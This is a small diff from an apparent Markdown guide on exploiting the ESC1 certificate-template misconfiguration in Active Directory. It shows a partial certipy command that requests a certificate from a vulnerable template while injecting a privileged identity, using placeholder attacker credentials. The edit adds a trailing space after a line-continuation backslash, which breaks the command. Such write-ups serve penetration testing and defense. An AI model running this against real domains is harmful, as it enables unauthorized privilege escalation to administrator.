@@ -58,7 +58,7 @@ Exploiting an ESC1 vulnerability typically involves two main steps:
 1. Requesting a certificate using the vulnerable template, injecting the identity of a privileged target(administrator).
  
 ```bash
-certipy req \
+certipy req \ 
     -u 'attacker@corp.local' -p 'Passw0rd!' \
     -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
     -ca 'CORP-CA' -template 'VulnTemplate' \
